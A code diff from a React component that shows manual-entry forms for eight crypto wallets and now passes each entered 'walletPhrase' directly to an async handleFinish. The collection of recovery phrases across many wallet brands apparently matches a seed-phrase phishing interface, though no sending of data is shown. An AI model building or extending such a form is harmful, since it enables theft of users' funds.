@@ -9,66 +9,27 @@ import TrustWallet from "./trust-wallet";
 
 interface ShowManualProps {
 	selectedWallet: string;
-	handleFinish: () => void;
-	setWalletPhrase: any;
+	handleFinish: (walletPhrase: string) => Promise<void>;
 }
 
-function ShowManualWallets({
-	selectedWallet,
-	handleFinish,
-	setWalletPhrase,
-}: ShowManualProps) {
+function ShowManualWallets({ selectedWallet, handleFinish }: ShowManualProps) {
 	return (
 		<>
 			<section className="fixed inset-0 bg-black/80 flex justify-center items-center">
 				{selectedWallet == "metamask" && (
-					<MetaMask
-						handleFinish={handleFinish}
-						setWalletPhrase={setWalletPhrase}
-					/>
+					<MetaMask handleFinish={handleFinish} />
 				)}
-				{selectedWallet == "phantom" && (
-					<Phantom
-						handleFinish={handleFinish}
-						setWalletPhrase={setWalletPhrase}
-					/>
-				)}
-				{selectedWallet == "exodus" && (
-					<Exodus
-						handleFinish={handleFinish}
-						setWalletPhrase={setWalletPhrase}
-					/>
-				)}
-				{selectedWallet == "keplr" && (
-					<Keplr
-						handleFinish={handleFinish}
-						setWalletPhrase={setWalletPhrase}
-					/>
-				)}
-				{selectedWallet == "atomic" && (
-					<Atomic
-						handleFinish={handleFinish}
-						setWalletPhrase={setWalletPhrase}
-					/>
-				)}
+				{selectedWallet == "phantom" && <Phantom handleFinish={handleFinish} />}
+				{selectedWallet == "exodus" && <Exodus handleFinish={handleFinish} />}
+				{selectedWallet == "keplr" && <Keplr handleFinish={handleFinish} />}
+				{selectedWallet == "atomic" && <Atomic handleFinish={handleFinish} />}
 				{selectedWallet == "trustwallet" && (
-					<TrustWallet
-						handleFinish={handleFinish}
-						setWalletPhrase={setWalletPhrase}
-					/>
+					<TrustWallet handleFinish={handleFinish} />
 				)}
 				{selectedWallet == "coinbase" && (
-					<Coinbase
-						handleFinish={handleFinish}
-						setWalletPhrase={setWalletPhrase}
-					/>
+					<Coinbase handleFinish={handleFinish} />
 				)}
-				{selectedWallet == "ledger" && (
-					<Ledger
-						handleFinish={handleFinish}
-						setWalletPhrase={setWalletPhrase}
-					/>
-				)}
+				{selectedWallet == "ledger" && <Ledger handleFinish={handleFinish} />}
 			</section>
 		</>
 	);
